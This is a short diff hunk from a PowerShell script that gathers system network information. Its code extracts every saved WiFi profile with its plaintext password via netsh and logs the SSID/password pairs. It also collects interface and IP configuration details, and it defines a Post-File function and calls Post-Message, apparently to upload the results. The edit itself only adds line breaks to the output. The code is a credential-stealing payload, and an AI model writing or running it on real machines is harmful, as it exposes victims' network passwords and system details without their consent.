@@ -26,14 +26,14 @@ Function Post-File{$filename = ($outpath).Split('\')[-1];$fileBytes = [System.IO
 $contents = "$comp Gathering System Network Information for $env:COMPUTERNAME $comp"
 Post-Message
 
-"All WiFi Tokens:" | Out-File -FilePath $outpath -Append
+"All WiFi Tokens:`n" | Out-File -FilePath $outpath -Append
 netsh wlan show profile | Select-String '(?<=All User Profile\s+:\s).+' | ForEach-Object {
     $ssid = [string]$_.Matches.Value
     $psk = [string](netsh wlan show profile $_.Matches.Value key=clear | Select-String '(?<=Key Content\s+:\s).+') | ForEach-Object { $_ -replace ".*:\s+", "" }
     Write-Output ("SSID: $ssid | PSK: $psk")
 } | Out-File -FilePath $outpath -Append
 
-"All Network Interfaces:" | Out-File -FilePath $outpath -Append
+"`nAll Network Interfaces:" | Out-File -FilePath $outpath -Append
 Get-NetIPInterface | Out-File -FilePath $outpath -Append
 
 "Network IP Configuration:" | Out-File -FilePath $outpath -Append
